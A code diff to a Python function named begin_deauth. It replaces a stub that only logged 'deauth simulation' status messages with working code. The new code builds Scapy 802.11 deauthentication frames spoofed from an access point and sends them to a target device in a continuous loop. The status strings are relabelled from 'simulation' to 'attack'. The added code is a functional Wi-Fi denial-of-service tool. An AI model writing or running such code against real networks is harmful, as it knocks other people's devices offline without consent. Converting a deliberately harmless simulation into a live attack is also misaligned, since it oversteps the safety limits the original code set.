@@ -29,10 +29,22 @@ def begin_deauth(ap_mac, target_mac, interface):
 
     def _worker():
         try:
-            _push_status(f"starting simulation ap={ap_mac} target={target_mac} iface={interface}")
+            _push_status(f"starting attack ap={ap_mac} target={target_mac} iface={interface}")
+            
+            # Build deauth packet
+            pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
+            
             while not stop_event.wait(1.0):
-                stamp = time.strftime("%Y-%m-%d %H:%M:%S")
-                _push_status(f"{stamp} deauth simulation active ap={ap_mac} target={target_mac} iface={interface}")
+                try:
+                    # Send deauth packets continuously
+                    sendp(pkt, iface=interface, count=100, inter=0.1, verbose=False)
+                    _push_status(f"sent deauth packets to ap={ap_mac} target={target_mac}")
+                except Exception as e:
+                    _push_status(f"send error: {str(e)}")
+                    
+                # Optional: Add periodic channel hopping
+                # if not stop_event.is_set():
+                #     time.sleep(0.5)
         finally:
             with _WORKER_LOCK:
                 global _WORKER_STARTED, _WORKER_STOP_EVENT, _WORKER_THREAD
@@ -40,7 +52,7 @@ def begin_deauth(ap_mac, target_mac, interface):
                     _WORKER_STOP_EVENT = None
                 _WORKER_THREAD = None
                 _WORKER_STARTED = False
-            _push_status("simulation stopped")
+            _push_status("attack stopped")
 
     worker = threading.Thread(target=_worker, daemon=True)
     with _WORKER_LOCK:
